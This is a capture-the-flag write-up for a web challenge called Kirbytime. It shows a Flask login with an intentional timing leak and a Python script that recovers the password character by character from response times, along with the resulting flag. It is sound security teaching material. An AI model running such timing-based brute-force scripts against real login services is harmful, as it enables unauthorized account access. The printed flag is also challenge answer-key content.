+++
title = 'Kirbytime'
tags = [
  "web",
  "python",
  "125 points",
  "218 solves",
  "Stephanie",
]
date = 2024-08-13T13:01:07+02:00
draft = true
+++

<h1 style='text-decoration: underline;text-decoration-color: #9e8c6c;font-size: 3em;'>Kirbytime</h1>

**Description**: Welcome to Kirby's Website.

## Introduction

We find ourselves in front of a very pink Kirby-themed page, where we are asked to enter a password of 7 characters.

## Source

```python
# filename: main.py

import sqlite3
from flask import Flask, request, redirect, render_template
import time
app = Flask(__name__)


@app.route('/', methods=['GET', 'POST'])
def login():
    message = None
    if request.method == 'POST':
        password = request.form['password']
        real = 'REDACTED'
        if len(password) != 7:
            return render_template('login.html', message="you need 7 chars")
        for i in range(len(password)):
            if password[i] != real[i]:
                message = "incorrect"
                return render_template('login.html', message=message)
            else:
                time.sleep(1)
        if password == real:
            message = "yayy! hi kirby"

    return render_template('login.html', message=message)


if __name__ == '__main__':
    app.run(host='0.0.0.0')

```

As we can see in the code at the '/' endpoint, when the method and post, it takes the password value from the form, checks the length to be 7 and starts iterating over each character to check if it is correct, it triggers a time.sleep(1) otherwise it returns an error.

## Solution

The solution is very simple, in fact we can compare it to a kind of time based, when the character is correct we know that the request will take n seconds to return depending on the number of correct characters. With this script we can easily find the flag, but only with a little patience (I recommend a cup of coffee in between).

```python
# filename: exploit.py

import string
import requests

url = 'redacted'

alphabet = string.printable

length = 7

correct_flag = 'a' * length
correct_letter = 0
flag_list = list(correct_flag)
number_of_second_to_wait = 7
while (correct_letter != length):
    for letter in alphabet:
        flag_list[correct_letter] = letter
        flag = "".join(flag_list)
        print(flag)
        payload = {"password": flag}
        r = requests.post(url=url, data=payload)
        assert r.status_code == 200
        print("Time: ", r.elapsed.total_seconds())
        if r.elapsed.total_seconds() >= number_of_second_to_wait:
            correct_letter = correct_letter + 1
            number_of_second_to_wait += 1
            print(flag)
            break

print("Flag found: ", "LITCTF{" + flag + "}")

```

```stdout
$ flag: LITCTF{kBySlaY}
```

<p align='right'>Author: akiidjk </p>
